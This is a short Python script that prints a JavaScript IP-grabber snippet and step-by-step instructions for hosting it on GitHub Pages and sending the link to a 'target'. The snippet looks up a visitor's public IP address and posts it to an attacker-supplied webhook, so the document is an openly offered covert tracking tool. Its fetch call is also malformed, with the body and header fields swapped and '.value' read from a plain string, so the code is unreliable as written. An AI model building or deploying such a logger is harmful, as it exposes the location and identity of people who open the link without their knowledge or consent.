from colorama import Fore

ipfetchcode = """
     async function apiget() {try {const hook = 'insert webhook here';const url = await fetch('https://api.ipify.org?format=json'); const data = await url.json();const info = data.ip;const msg = 'insert message here';await fetch(hook, {method: 'POST',body: { 'Content-Type': 'application/json' },header: JSON.stringify({ content: `${msg.value} ${info}` })});} catch{}}    apiget()      
     """
howto = """
     How to SetUp:

     1. Make a HTML file and paste the generated code there (remember to config ur generated code)
     2. Go to any website publisher (Recommend Github)
     3. Create a reposetory and upload ur HTML file there
     4. Go to reposetory settings
     5. Go to Github pages
     6. Click Pages
     7. Config Build Deployment to 'Deploy from branch' and Branch to 'main' and 'root' and click save
     8. Go to your main reposetory page (Code section)
     9. Click on Green dot
     10. Copy ur web url to ur target and boom

     Incase you dont understand it, goto https://www.youtube.com/watch?v=BT4WzyT2g8k
     """
print(f"{Fore.WHITE}",ipfetchcode)
print(f"{Fore.YELLOW}",howto)